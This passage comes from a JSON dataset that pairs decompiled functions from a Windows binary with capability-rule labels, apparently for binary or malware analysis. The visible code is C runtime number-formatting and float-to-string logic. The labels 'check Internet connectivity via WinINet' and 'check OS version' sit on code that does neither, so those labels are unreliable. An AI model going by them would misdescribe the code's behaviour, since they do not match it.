iVar22 + -1;\n                    } while (0 < iVar22);\n                    uVar7 = *(arg2 + 1);\n                }\n            }\n            else {\n                *(arg2 + 0xc) = iVar22;\n            }\n        }\n        else {\n            *(arg2 + 0xc) = 0xffffffff;\n        }\n    }\n    if ((uVar7 & 0x80) == 0) {\n        if ((uVar7 & 0x100) == 0) {\n            if ((uVar7 & 0x40) != 0) {\n                fcn.140014dc0(0x20, arg2);\n            }\n        }\n        else {\n            fcn.140014dc0(0x2b, arg2);\n        }\n    }\n    else {\n        fcn.140014dc0(0x2d, arg2);\n    }\n    fcn.140014dc0(0x30, arg2);\n    fcn.140014dc0(*(arg2 + 1) & 0x20 | 0x58, arg2);\n    if ((0 < *(arg2 + 0xc)) && ((*(arg2 + 9) & 2) != 0)) {\n        *(arg2 + 0xc) = *(arg2 + 0xc) + -1;\n        do {\n            fcn.140014dc0(0x30, arg2);\n            iVar22 = *(arg2 + 0xc);\n            *(arg2 + 0xc) = iVar22 + -1;\n        } while (0 < iVar22);\n    }\n    if (&uStack88 < puVar14) {\n        do {\n            uVar7 = puVar14[-1];\n            puVar14 = puVar14 + -1;\n            if (uVar7 == 0x2e) {\n                fcn.140015a90(arg2);\n            }\n            else if (uVar7 == 0x2c) {\n                iStack90 = *(arg2 + 4);\n                if (*(arg2 + 4) != 0) {\n                    fcn.140014e20(&iStack90, 1, arg2);\n                }\n            }\n            else {\n                fcn.140014dc0(uVar7, arg2);\n            }\n        } while (puVar14 != &uStack88);\n    }\n    while (iVar22 = *(arg2 + 2),  *(arg2 + 2) = iVar22 + -1,  0 < iVar22) {\n        fcn.140014dc0(0x30, arg2);\n    }\n    fcn.140014dc0(*(arg2 + 1) & 0x20 | 0x50, arg2);\n    *(arg2 + 0xc) = *(arg2 + 0xc) + iVar15;\n    uVar9 = uVar16;\n    *(arg2 + 1) = *(arg2 + 1) | 0x1c0;\n    iVar22 = *(arg2 + 2);\n    uVar7 = *(arg2 + 1);\n    iVar15 = *(arg2 + 0xc);\n    auStack112[0] = 0x14001574a;\n    iVar6 = fcn.14000ae90(uVar9);\n    iVar6 = -iVar6;\n    pcVar1 = acStack72 + iVar6;\n    if ((uVar7 & 0x80) == 0) {\ncode_r0x000140015769:\n        if (uVar9 != 0) goto code_r0x000140015772;\n        pcVar17 = pcVar1;\n        pcVar18 = pcVar1;\n        iVar11 = iVar22;\n        if (0 < iVar22) goto code_r0x00014001581a;\ncode_r0x0001400159b9:\n        if (iVar22 == 0) goto code_r0x000140015839;\n    }\n    else {\n        if (-1 < uVar9) {\n            uVar7 = uVar7 & 0xffffff7f;\n            *(arg2 + 1) = uVar7;\n            goto code_r0x000140015769;\n        }\n        uVar9 = -uVar9;\ncode_r0x000140015772:\n        pcVar18 = pcVar1;\n        while( true ) {\n            pcVar17 = pcVar18;\n            pcVar18 = pcVar17 + 1;\n            uVar13 = uVar9 / 10;\n            *pcVar17 = uVar9 + uVar13 * -10 + '0';\n            if (uVar9 < 10) break;\n            uVar9 = uVar13;\n            if ((((pcVar1 != pcVar18) && ((uVar7 & 0x1000) != 0)) && (*(arg2 + 4) != 0)) &&\n               ((pcVar18 - pcVar1 & 0x8000000000000003U) == 3)) {\n                pcVar17[1] = ',';\n                pcVar18 = pcVar17 + 2;\n            }\n        }\n        if (iVar22 < 1) {\n            if (pcVar1 != pcVar18) goto code_r0x000140015839;\n            goto code_r0x0001400159b9;\n        }\n        iVar11 = iVar22 - (pcVar18 - pcVar1);\n        pcVar17 = pcVar18;\n        if (0 < iVar11) {\ncode_r0x00014001581a:\n            pcVar18 = pcVar17 + iVar11;\n            *(auStack112 + iVar6) = 0x140015830;\n            sub.msvcrt.dll_memset(pcVar17, 0x30, iVar11);\n        }\n        if (pcVar1 != pcVar18) goto code_r0x000140015839;\n    }\n    *pcVar18 = '0';\n    pcVar18 = pcVar18 + 1;\ncode_r0x000140015839:\n    pcVar17 = pcVar18;\n    if (0 < iVar15) {\n        iVar15 = iVar15 - (pcVar18 - pcVar1);\n        *(arg2 + 0xc) = iVar15;\n        if (0 < iVar15) {\n            if ((uVar7 & 0x1c0) != 0) {\n                *(arg2 + 0xc) = iVar15 + -1;\n            }\n            if ((iVar22 < 0) && ((uVar7 & 0x600) == 0x200)) {\n                iVar22 = *(arg2 + 0xc);\n                uVar10 = iVar22 - 1;\n                *(arg2 + 0xc) = uVar10;\n                if (0 < iVar22) {\n                    iVar12 = uVar10 + 1;\n                    pcVar17 = pcVar18 + iVar12;\n                    *(auStack112 + iVar6) = 0x140015a22;\n                    sub.msvcrt.dll_memset(pcVar18, 0x30, iVar12);\n                    *(arg2 + 0xc) = 0xffffffff;\n                }\n            }\n            else if (((uVar7 & 0x400) == 0) && (iVar22 = *(arg2 + 0xc),  *(arg2 + 0xc) = iVar22 + -1,  0 < iVar22)) {\n                do {\n                    *(auStack112 + iVar6) = 0x140015a55;\n                    fcn.140014dc0(0x20, arg2);\n                    iVar22 = *(arg2 + 0xc);\n                    *(arg2 + 0xc) = iVar22 + -1;\n                } while (0 < iVar22);\n                uVar7 = *(arg2 + 1);\n            }\n        }\n    }\n    if ((uVar7 & 0x80) == 0) {\n        if ((uVar7 & 0x100) == 0) {\n            if ((uVar7 & 0x40) != 0) {\n                *pcVar17 = ' ';\n                pcVar17 = pcVar17 + 1;\n            }\n        }\n        else {\n            *pcVar17 = '+';\n            pcVar17 = pcVar17 + 1;\n        }\n    }\n    else {\n        *pcVar17 = '-';\n        pcVar17 = pcVar17 + 1;\n    }\n    if (pcVar1 < pcVar17) {\n        do {\n            pcVar17 = pcVar17 + -1;\n            if (((uVar7 & 0x4000) == 0) && (iVar22 = *(arg2 + 0x24),  *(arg2 + 5) == iVar22 || *(arg2 + 5) < iVar22)) {\ncode_r0x00014001589a:\n                *(arg2 + 0x24) = iVar22 + 1;\n            }\n            else {\n                if ((uVar7 & 0x2000) == 0) {\n                    *(*arg2 + *(arg2 + 0x24)) = *pcVar17;\n                    iVar22 = *(arg2 + 0x24);\n                    goto code_r0x00014001589a;\n                }\n                *(auStack112 + iVar6) = 0x1400158d2;\n                sub.msvcrt.dll_fputc();\n                *(arg2 + 0x24) = *(arg2 + 0x24) + 1;\n            }\n            if (pcVar1 == pcVar17) break;\n            uVar7 = *(arg2 + 1);\n        } while( true );\n    }\n    iVar22 = *(arg2 + 0xc);\n    while( true ) {\n        *(arg2 + 0xc) = iVar22 + -1;\n        if (iVar22 < 1) break;\n        if (((*(arg2 + 1) & 0x4000) != 0) ||\n           (iVar15 = *(arg2 + 0x24),  iVar22 = iVar22 + -1,  *(arg2 + 5) != iVar15 && iVar15 <= *(arg2 + 5))) {\n            if ((*(arg2 + 1) & 0x2000) == 0) {\n                *(*arg2 + *(arg2 + 0x24)) = 0x20;\n                iVar15 = *(arg2 + 0x24);\n                iVar22 = *(arg2 + 0xc);\n            }\n            else {\n                *(auStack112 + iVar6) = 0x14001592a;\n                sub.msvcrt.dll_fputc();\n                iVar15 = *(arg2 + 0x24);\n                iVar22 = *(arg2 + 0xc);\n            }\n        }\n        *(arg2 + 0x24) = iVar15 + 1;\n    }\n    return;\n}\n",
        "token_count": 4429
    },
    "1400174e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x0001400177fd: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x000140017802)\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t * fcn.1400174e0(int32_t *arg1, ulong arg2, uint32_t *arg3, uint32_t *arg4)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint64_t arg1_00;\n    int64_t iVar7;\n    uint32_t *puVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    uint32_t *puVar11;\n    uint32_t uVar12;\n    char *pcVar13;\n    uint64_t uVar14;\n    uint8_t uVar15;\n    uint32_t uVar16;\n    bool bVar17;\n    uint64_t unaff_RBX;\n    uint32_t *puVar18;\n    uint32_t uVar19;\n    uint64_t unaff_RSI;\n    int32_t *unaff_RDI;\n    int64_t iVar20;\n    int32_t iVar21;\n    uint64_t extraout_XMM0_Qa;\n    double dVar22;\n    double dVar23;\n    double dVar24;\n    double dVar25;\n    double dVar26;\n    uint32_t in_stack_00000028;\n    uint32_t in_stack_00000030;\n    uint32_t *in_stack_00000038;\n    uint32_t **in_stack_00000040;\n    ulong uStack256;\n    uint32_t *puStack216;\n    uint32_t *puStack208;\n    uint32_t **ppuStack200;\n    uint32_t *puStack192;\n    uint32_t uStack180;\n    uint32_t uStack176;\n    uint32_t uStack172;\n    uint32_t uStack168;\n    uint32_t uStack164;\n    uint32_t *puStack160;\n    ulong uStack152;\n    ulong uStack144;\n    uint32_t uStack136;\n    uint32_t uStack132;\n    ulong uStack128;\n    double dStack120;\n    int32_t iStack112;\n    uint32_t uStack108;\n    uint32_t uStack92;\n    \n    uVar12 = *arg4;\n    puStack216 = puStack216 & 0xffffffff00000000 | in_stack_00000028;\n    puStack192 = arg3;\n    uStack176 = in_stack_00000030;\n    puStack208 = in_stack_00000038;\n    ppuStack200 = in_stack_00000040;\n    *arg4 = uVar12 & 0xffffffcf;\n    uVar4 = uVar12 & 7;\n    if (uVar4 == 3) {\n        uVar12 = 8;\n        pcVar13 = \"Infinity\";\n        *in_stack_00000038 = 0xffff8000;\n        goto code_r0x0001400172c0;\n    }\n    uStack180 = uVar12 & 4;\n    uVar14 = uStack180;\n    if (uStack180 != 0) {\n        if (uVar4 != 4) {\n            return NULL;\n        }\n        uVar12 = 3;\n        pcVar13 = 0x1400d6e19;\n        *in_stack_00000038 = 0xffff8000;\n        goto code_r0x0001400172c0;\n    }\n    if (uVar4 != 0) {\n        if (1 < uVar4 - 1) {\n            return NULL;\n        }\n        iVar5 = *arg1;\n        uVar14 = 0;\n        iVar6 = 0x20;\n        if (0x20 < iVar5) {\n            do {\n                iVar2 = iVar6 * 2;\n                uVar14 = uVar14 + 1;\n                iVar21 = iVar6 * -2;\n                iVar6 = iVar2;\n            } while (iVar5 != iVar2 && SBORROW4(iVar5, iVar2) == iVar5 + iVar21 < 0);\n        }\n        uStack256 = 0x1400175f7;\n        arg1_00 = fcn.140018e70(uVar14);\n        iVar20 = iVar5 + -1 >> 5;\n        puVar8 = puStack192;\n        puVar11 = arg1_00 + 0x18;\n        do {\n            uVar4 = *puVar8;\n            puVar8 = puVar8 + 1;\n            *puVar11 = uVar4;\n            puVar11 = puVar11 + 1;\n        } while (puVar8 <= puStack192 + iVar20);\n        iVar7 = iVar20 * 4 + 4;\n        if (puStack192 + iVar20 + 1U < puStack192 + 1U) {\n            iVar7 = 4;\n        }\n        uVar14 = iVar7 >> 2 & 0xffffffff;\n        iVar20 = arg1_00 + (iVar7 >> 2) * 4;\ncode_r0x00014001766c:\n        iVar6 = uVar14;\n        uVar4 = iVar6 - 1;\n        uVar14 = uVar4;\n        if (*(iVar20 + 0x14) == 0) goto code_r0x000140017660;\n        *(arg1_00 + 0x14) = iVar6;\n        puVar8 = arg1_00 + 0x18 + uVar4 * 4;\n        uVar4 = 0x1f;\n        if (*puVar8 != 0) {\n            for (; *puVar8 >> uVar4 == 0; uVar4 = uVar4 - 1) {\n            }\n        }\n        uVar14 = iVar6 * 0x20 - (uVar4 ^ 0x1f);\n        goto code_r0x000140017691;\n    }\n    goto code_r0x0001400177e0;\ncode_r0x000140017660:\n    iVar20 = iVar20 + -4;\n    if (uVar4 == 0) goto code_r0x000140017838;\n    goto code_r0x00014001766c;\ncode_r0x000140018133:\n    uStack256 = 0x140018143;\n    arg1_00 = fcn.140018fe0(arg1_00, 10, 0);\n    if (uVar9 == uVar14) {\n        uStack256 = 0x14001828d;\n        uVar9 = fcn.140018fe0(uVar9, 10, 0);\n        uVar14 = uVar9;\n    }\n    else {\n        uStack256 = 0x14001815f;\n        uVar9 = fcn.140018fe0(uVar9, 10, 0);\n        uStack256 = 0x140018172;\n        uVar14 = fcn.140018fe0(uVar14, 10, 0);\n    }\n    uStack92 = uStack92 + 1;\n    puVar11 = puVar8;\n    goto code_r0x000140018180;\ncode_r0x000140017b01:\n    uVar15 = uVar16 + 1;\ncode_r0x000140017b09:\n    *puVar8 = uVar15;\n    uStack176 = uVar19 + 1;\n    uStack180 = 0x20;\n    puVar18 = puStack160;\n    puVar8 = puVar11;\n    goto code_r0x000140017e2b;\ncode_r0x0001400185cd:\n    uStack180 = 0x20;\n    *puVar18 = uVar15 + 1;\ncode_r0x000140018240:\n    uStack256 = 0x14001824d;\n    puStack216 = uVar9;\n    fcn.140018f70(iVar20);\n    puVar18 = puStack160;\n    if (uVar14 == 0) goto code_r0x000140017e2b;\n    if ((puStack216 != NULL) && (puStack216 != uVar14)) {\n        uStack256 = 0x140018275;\n        fcn.140018f70(puStack216);\n        puVar18 = puStack160;\n    }\ncode_r0x000140017e23:\n    puStack160 = puVar8;\n    uStack256 = 0x140017e2b;\n    fcn.140018f70(uVar14);\n    puVar8 = puStack160;\ncode_r0x000140017e2b:\n    puStack160 = puVar8;\n    uStack256 = 0x140017e33;\n    fcn.140018f70(arg1_00);\n    *puStack160 = 0;\n    *puStack208 = uStack176;\n    if (ppuStack200 != NULL) {\n        *ppuStack200 = puStack160;\n    }\n    *arg4 = *arg4 | uStack180;\n    return puVar18;\ncode_r0x000140017838:\n    *(arg1_00 + 0x14) = 0;\ncode_r0x000140017691:\n    uStack256 = 0x14001769c;\n    uStack92 = fcn.140018cf0(arg1_00);\n    uVar4 = arg2;\n    if (uStack92 != 0) {\n        uStack256 = 0x140017852;\n        fcn.140018bf0(arg1_00, uStack92);\n        uVar4 = arg2 + uStack92;\n        uVar14 = uVar14 - uStack92;\n    }\n    if (*(arg1_00 + 0x14) != 0) {\n        uStack256 = 0x1400176c8;\n        fcn.1400197e0(arg1_00, &stack0xffffffffffffffa4);\n        iVar6 = uVar14;\n        uVar19 = (uVar4 + iVar6) - 1;\n        uVar16 = extraout_XMM0_Qa >> 0x20 & 0xfffff | 0x3ff00000;\n        iVar21 = ((uVar19 >> 0x1f ^ uVar19) - (uVar19 >> 0x1f)) + -0x435;\n        dVar22 = uVar19 * *0x1400d6e38 +\n                 *0x1400d6e30 + ((extraout_XMM0_Qa & 0xffffffff | uVar16 << 0x20) - *0x1400d6e20) * *0x1400d6e28;\n        if (0 < iVar21) {\n            dVar22 = dVar22 + iVar21 * *0x1400d6e40;\n        }\n        dVar26 = 0.0;\n        uStack136 = dVar22;\n        if ((dVar22 < 0.0) && (uStack136 != dVar22)) {\n            uStack136 = uStack136 - 1;\n        }\n        dStack120 = extraout_XMM0_Qa & 0xffffffff | uVar16 + uVar19 * 0x100000 << 0x20;\n        uStack168 = (iVar6 - uVar19) - 1;\n        if (uStack136 < 0x17) {\n            if (dStack120 < *(*0x1400d7120 + uStack136 * 8)) {\n                iStack112 = 0;\n                uStack136 = uStack136 - 1;\n                goto code_r0x00014001787b;\n            }\n            uStack152 = uStack152._4_4_ << 0x20;\n            iStack112 = 0;\n            if (uStack168 < 0) goto code_r0x000140017e60;\ncode_r0x000140017b3f:\n            uStack168 = uStack168 + uStack136;\n            uStack132 = 0;\n            uVar19 = uStack136;\n        }\n        else {\n            iStack112 = 1;\ncode_r0x00014001787b:\n            uStack152 = uStack152._4_4_ << 0x20;\n            if (uStack168 < 0) {\ncode_r0x000140017e60:\n                uStack168 = 0;\n                uStack152 = uStack152 | 1 - (iVar6 - uVar19);\n            }\n            if (-1 < uStack136) goto code_r0x000140017b3f;\n            uStack152 = uStack152 & 0xffffffff00000000 | uStack152 - uStack136;\n            uStack132 = -uStack136;\n            uVar19 = 0;\n        }\n        if (puStack216 < 10) {\n            if (puStack216 < 6) {\n                uStack164 = uVar4 + iVar6 + 0x3fd < 0x7f8;\n            }\n            else {\n                uStack164 = 0;\n                puStack216 = puStack216 & 0xffffffff00000000 | puStack216 - 4;\n            }\n            if (puStack216 == 4) {\n                uStack144 = CONCAT44(uStack144._4_4_, 1);\ncode_r0x000140017904:\n                uVar14 = 1;\n                if (0 < uStack176) {\n                    uVar14 = uStack176;\n                }\n                uStack176 = uVar14;\n                uStack172 = uStack176;\n                uStack108 = uStack176;\n                uStack92 = uStack176;\n            }\n            else {\n                if (puStack216 == 5) {\n                    uStack144 = CONCAT44(uStack144._4_4_, 1);\n                }\n                else {\n                    if (puStack216 == 2) {\n                        uStack144 = uStack144._4_4_ << 0x20;\n                        goto code_r0x000140017904;\n                    }\n                    if (puStack216 != 3) goto code_r0x000140017b68;\n                    uStack144 = uStack144._4_4_ << 0x20;\n                }\n                uStack108 = uStack176 + uStack136;\n                uStack172 = uStack108 + 1;\n                if (uStack172 < 1) {\n                    uStack92 = 1;\n                    uVar14 = 1;\n                }\n                else {\n                    uVar14 = uStack172;\n                    uStack92 = uStack172;\n                }\n            }\n            uStack128 = uStack128 & 0xffffffff00000000 | uVar19;\n            uStack256 = 0x140017932;\n            dVar26 = 0.0;\n            puStack160 = fcn.140017280(uVar14);\n            uStack164._0_1_ = uStack164 & uStack172 < 0xf;\n            uStack164 = arg1[3] - 1;\n            if (uStack164 != 0) {\ncode_r0x000140017959:\n                uVar19 = 2;\n                if (-1 < uStack164) {\n                    uVar19 = uStack164;\n                }\n                uStack164 = uVar19;\n                if ((uVar12 & 8) != 0) {\n                    uStack164 = 3 - uVar19;\n                    goto code_r0x000140017981;\n                }\ncode_r0x000140017f48:\n                if ((uVar4 < 0) || (arg1[5] < uStack136)) {\n                    if (uStack144 != 0) {\ncode_r0x000140017be0:\n                        iVar21 = arg1[1];\n                        uStack92 = (iVar5 - iVar6) + 1;\n                        if (uVar4 - (iVar5 - iVar6) < iVar21) goto code_r0x000140017c00;\ncode_r0x0001400182b0:\n                        if (puStack216 < 2) goto code_r0x000140018555;\ncode_r0x0001400182bb:\n                        uVar4 = uStack172 - 1;\n                        if (uStack132 < uVar4) {\n                            uVar12 = 0;\n                            uStack128._0_4_ = uStack128 + (uVar4 - uStack132);\n                            uStack132 = uVar4;\n                        }\n                        else {\n                            uVar12 = uStack132 - uVar4;\n                        }\n                        if (uStack172 < 0) {\n                            uStack92 = 0;\n                            uStack152._0_4_ = uStack152 - uStack172;\n                        }\n                        else {\n                            uStack168 = uStack168 + uStack172;\n                            uStack92 = uStack172;\n                            uStack152 = uStack152 & 0xffffffff00000000 | uStack172 + uStack152;\n                        }\n                        goto code_r0x000140017c54;\n                    }\n                    uVar14 = 0;\n                    uVar12 = uStack132;\n                    uVar4 = uStack152;\n                    goto code_r0x000140017c73;\n                }\n                dVar22 = *(*0x1400d7120 + uStack136 * 8);\n                if ((-1 < uStack176) || (0 < uStack172)) goto code_r0x000140018443;\n                if ((uStack172 == 0) && (dVar22 * *0x1400d6e70 < dStack120)) {\n                    uStack176 = uStack136 + 2;\n                    iVar20 = 0;\n                    uVar14 = 0;\n                    goto code_r0x000140017e05;\n                }\ncode_r0x00014001801d:\n                iVar20 = 0;\n                uVar14 = 0;\n                goto code_r0x000140018023;\n            }\ncode_r0x000140017981:\n            dVar22 = *0x1400d6e58;\n            if ((uStack164 == 0) || ((uStack164 | uStack136) != 0)) goto code_r0x000140017f48;\n            uStack92 = 0;\n            if ((iStack112 != 0) && (dStack120 < *0x1400d6e50)) {\n                if (uStack172 == 0) {\n                    dVar22 = dStack120 + dStack120 + *0x1400d6e68;\n                    dVar24 = dVar22 & 0xffffffff | (dVar22 >> 0x20) + 0xfcc00000 << 0x20;\n                    goto code_r0x000140017f14;\n                }\n                if (0 < uStack108) {\n                    dVar23 = dStack120 * *0x1400d6e58;\n                    uVar19 = 0xffffffff;\n                    dVar24 = *0x1400d6e60 * dVar23 + *0x1400d6e68;\n                    dVar24 = dVar24 & 0xffffffff | (dVar24 >> 0x20) + 0xfcc00000 << 0x20;\n                    uVar12 = uStack108;\n                    goto code_r0x000140017a0b;\n                }\ncode_r0x000140017f3d:\n                uStack164 = 0;\n                goto code_r0x000140017f48;\n            }\n            dVar24 = dStack120 + dStack120 + *0x1400d6e68;\n            dVar24 = dVar24 & 0xffffffff | (dVar24 >> 0x20) + 0xfcc00000 << 0x20;\n            if (uStack172 != 0) {\n                uVar19 = 0;\n                uVar12 = uStack172;\n                dVar23 = dStack120;\ncode_r0x000140017a0b:\n                dVar25 = *(*0x1400d7120 + (uVar12 - 1) * 8);\n                if (uStack144 != 0) {\n                    puVar8 = puStack160 + 1;\n                    dVar24 = *0x1400d6e90 / dVar25 - dVar24;\n                    *puStack160 = dVar23 + 0x30;\n                    dVar25 = *0x1400d6e58;\n                    dVar22 = *0x1400d6e50;\n                    dVar23 = dVar23 - dVar23;\n                    puVar11 = puVar8;\n                    if (dVar24 <= dVar23) {\n                        do {\n                            if (dVar22 - dVar23 < dVar24) {\n                                uVar16 = *(puVar11 + -1);\n                                goto code_r0x000140017af8;\n                            }\n                            uStack92 = uStack92 + 1;\n                            if (uVar12 <= uStack92) goto code_r0x000140017f3d;\n                            dVar23 = dVar23 * dVar25;\n                            puVar8 = puVar11 + 1;\n                            dVar24 = dVar24 * dVar25;\n                            iVar21 = dVar23;\n                            *puVar11 = iVar21 + 0x30;\n                            dVar23 = dVar23 - iVar21;\n                            puVar11 = puVar8;\n                        } while (dVar24 <= dVar23);\n                    }\n                    uStack176 = uVar19 + 1;\n                    puVar18 = puStack160;\n                    if (dVar23 == dVar26) {\n                        uStack180 = 0;\n                    }\n                    else {\ncode_r0x00014001872b:\n                        puStack160 = puVar8;\n                        uStack180 = 0x10;\n                        puVar8 = puStack160;\n                    }\n                    goto code_r0x000140017e2b;\n                }\n                dVar25 = dVar25 * dVar24;\n                uStack92 = 1;\n                puVar8 = puStack160;\n                dVar24 = dVar23;\n                uVar15 = 0;\n                while( true ) {\n                    iVar21 = dVar24;\n                    if (iVar21 != 0) {\n                        dVar24 = dVar24 - iVar21;\n                        uVar15 = uStack164;\n                    }\n                    puVar11 = puVar8 + 1;\n                    uVar16 = iVar21 + 0x30;\n                    *puVar8 = uVar16;\n                    if (uStack92 == uVar12) break;\n                    dVar24 = dVar24 * dVar22;\n                    uStack92 = uStack92 + 1;\n                    puVar8 = puVar11;\n                    uVar15 = uStack164;\n                }\n                if (uVar15 == 0) {\n                    dVar24 = dVar23;\n                }\n                if (dVar25 + *0x1400d6e90 < dVar24) {\ncode_r0x000140017af8:\n                    do {\n                        puVar8 = puVar11 + -1;\n                        if (uVar16 != '9') goto code_r0x000140017b01;\n                        if (puVar8 == puStack160) {\n                            uVar19 = uVar19 + 1;\n                            uVar15 = 0x31;\n                            *puStack160 = 0x30;\n                            goto code_r0x000140017b09;\n                        }\n                        uVar16 = *(puVar11 + -2);\n                        puVar11 = puVar8;\n                    } while( true );\n                }\n                if (dVar24 < *0x1400d6e90 - dVar25) {\n                    if (dVar24 == dVar26) {\n                        uStack180 = 0;\n                        uStack176 = uVar19 + 1;\n                    }\n                    else {\n                        uStack180 = 0x10;\n                        uStack176 = uVar19 + 1;\n                    }\ncode_r0x0001400186f0:\n                    do {\n                        puVar8 = puVar11;\n                        puVar11 = puVar8 + -1;\n                        puVar18 = puStack160;\n                    } while (*(puVar8 + -1) == 0x30);\n                    goto code_r0x000140017e2b;\n                }\n                goto code_r0x000140017f3d;\n            }\ncode_r0x000140017f14:\n            if (dStack120 - *0x1400d6e70 <= dVar24) {\n                if ((dVar24 ^ *0x1400d6e80) <= dStack120 - *0x1400d6e70) goto code_r0x000140017f3d;\n                goto code_r0x00014001801d;\n            }\n            uStack176 = 2;\n            iVar20 = 0;\n            uVar14 = 0;\ncode_r0x000140017e05:\n            *puStack160 = 0x31;\n            uStack180 = 0x20;\n            puVar18 = puStack160;\n            puStack160 = puStack160 + 1;\n        }\n        else {\n            puStack216 = puStack216 & 0xffffffff00000000;\ncode_r0x000140017b68:\n            uStack92 = iVar5 * *0x1400d6e48 + 3;\n            uStack256 = 0x140017b91;\n            uStack176 = uVar19;\n            puStack160 = fcn.140017280(uStack92);\n            uStack128._0_4_ = uStack176;\n            uStack164 = arg1[3] - 1;\n            if (uStack164 != 0) {\n                uStack176 = 0;\n                uStack164._0_1_ = 0;\n                uStack144 = CONCAT44(uStack144._4_4_, 1);\n                uStack108 = 0xffffffff;\n                uStack172 = 0xffffffff;\n                goto code_r0x000140017959;\n            }\n            if (-1 < uVar4) {\n                if (arg1[5] < uStack136) {\n                    uStack176 = 0;\n                    uStack172 = 0xffffffff;\n                    uStack108 = 0xffffffff;\n                    goto code_r0x000140017be0;\n                }\n                uStack172 = 0xffffffff;\n                dVar22 = *(*0x1400d7120 + uStack136 * 8);\ncode_r0x000140018443:\n                uStack92 = 1;\n                uStack176 = uStack136 + 1;\n                uVar12 = dStack120 / dVar22;\n                *puStack160 = uVar12 + 0x30;\n                dVar23 = *0x1400d6e58;\n                puVar3 = puStack160;\n                for (dVar24 = dStack120 - uVar12 * dVar22; puVar11 = puVar3 + 1,  puVar18 = puStack160, \n                    puVar8 = puVar11,  dVar24 != dVar26; dVar24 = dVar24 * dVar23 - uVar12 * dVar22) {\n                    if (uStack92 == uStack172) {\n                        uVar19 = uStack136;\n                        if (uStack164 != 0) {\n                            if (uStack164 != 1) goto code_r0x00014001872b;\n                            uVar16 = *puVar3;\n                            goto code_r0x000140017af8;\n                        }\n                        uVar16 = *puVar3;\n                        if ((dVar22 < dVar24 + dVar24) || ((dVar24 + dVar24 == dVar22 && ((uVar12 & 1) != 0))))\n                        goto code_r0x000140017af8;\n                        uStack180 = 0x10;\n                        goto code_r0x0001400186f0;\n                    }\n                    uStack92 = uStack92 + 1;\n                    uVar12 = (dVar24 * dVar23) / dVar22;\n                    *puVar11 = uVar12 + 0x30;\n                    puVar3 = puVar11;\n                }\n                goto code_r0x000140017e2b;\n            }\n            iVar21 = arg1[1];\n            uStack176 = 0;\n            uStack92 = (iVar5 - iVar6) + 1;\n            uStack108 = 0xffffffff;\n            uStack172 = 0xffffffff;\n            if (uVar4 - (iVar5 - iVar6) < iVar21) {\ncode_r0x000140017c00:\n                if ((puStack216 - 3 & 0xfffffffd) == 0) goto code_r0x0001400182b0;\n                uStack92 = (uVar4 - iVar21) + 1;\n                if ((1 < puStack216 && 0 < uStack172) && (uStack172 < uStack92)) goto code_r0x0001400182bb;\n                uStack168 = uStack168 + uStack92;\n                uStack152 = uStack152 & 0xffffffff00000000 | uStack92 + uStack152;\n                uVar12 = uStack132;\n            }\n            else {\ncode_r0x000140018555:\n                uStack168 = uStack168 + uStack92;\n                uStack152 = uStack152 & 0xffffffff00000000 | uStack92 + uStack152;\n                uVar12 = uStack132;\n            }\ncode_r0x000140017c54:\n            uStack256 = 0x140017c63;\n            uVar14 = fcn.140019090(1);\n            uStack144 = CONCAT44(uStack144._4_4_, 1);\n            uVar4 = uStack152;\ncode_r0x000140017c73:\n            if ((0 < uVar4) && (0 < uStack168)) {\n                uStack92 = uStack168;\n                if (uVar4 <= uStack168) {\n                    uStack92 = uVar4;\n                }\n                uStack152 = uStack152 & 0xffffffff00000000 | uStack152 - uStack92;\n                uStack168 = uStack168 - uStack92;\n                uVar4 = uVar4 - uStack92;\n            }\n            if (uStack132 != 0) {\n                if (uStack144 == 0) {\n                    uStack128 = uStack128 & 0xffffffff00000000 | uStack128;\n                    uStack256 = 0x14001850d;\n                    arg1_00 = fcn.1400192b0(arg1_00, uStack132);\n                }\n                else {\n                    if (0 < uVar12) {\n                        dStack120 = dStack120 & 0xffffffff00000000 | uStack128;\n                        uStack256 = 0x140017cc9;\n                        uVar14 = fcn.1400192b0(uVar14, uVar12);\n                        uStack256 = 0x140017cd7;\n                        uStack128 = fcn.140019150(uVar14, arg1_00);\n                        uStack256 = 0x140017ce4;\n                        fcn.140018f70(arg1_00);\n                        arg1_00 = uStack128;\n                        uStack128._0_4_ = dStack120._0_4_;\n                    }\n                    uVar12 = uStack132 - uVar12;\n                    if (uVar12 != 0) {\n                        uStack256 = 0x14001858b;\n                        uStack132 = uStack128;\n                        arg1_00 = fcn.1400192b0(arg1_00, uVar12);\n                        uStack128._0_4_ = uStack132;\n                    }\n                }\n            }\n            uStack256 = 0x140017d0d;\n            uStack132 = uStack128;\n            iVar20 = fcn.140019090(1);\n            uVar12 = uStack132;\n            bVar17 = iVar6 == 1 && puStack216 < 2;\n            if (uStack132 < 1) {\n                uStack132 = 0;\n                if ((bVar17) && (arg1[1] + 1 < arg2)) {\ncode_r0x0001400188c9:\n                    uStack152 = uStack152 & 0xffffffff00000000 | uStack152 + 1;\n                    uStack168 = uStack168 + 1;\n                    uStack132 = 1;\n                }\n                uVar19 = 0x1f;\n                if (uVar12 != 0) goto code_r0x000140018063;\n            }\n            else {\n                uStack256 = 0x14001804b;\n                iVar20 = fcn.1400192b0(iVar20, uStack132);\n                if ((bVar17) && (uVar12 = uStack132,  arg1[1] + 1 < arg2)) goto code_r0x0001400188c9;\n                uStack132 = 0;\ncode_r0x000140018063:\n                puVar8 = iVar20 + 0x18 + (*(iVar20 + 0x14) + -1) * 4;\n                uVar19 = 0x1f;\n                if (*puVar8 != 0) {\n                    for (; *puVar8 >> uVar19 == 0; uVar19 = uVar19 - 1) {\n                    }\n                }\n                uVar19 = uVar19 ^ 0x1f;\n            }\n            uVar12 = (uVar19 - uStack168) - 4 & 0x1f;\n            uStack92 = uVar12;\n            if (0 < uStack152 + uVar12) {\n                uStack256 = 0x140017d77;\n                arg1_00 = fcn.1400194b0(arg1_00, uStack152 + uVar12);\n            }\n            if (0 < uStack92 + uStack168) {\n                uStack256 = 0x140017d91;\n                iVar20 = fcn.1400194b0(iVar20, uStack92 + 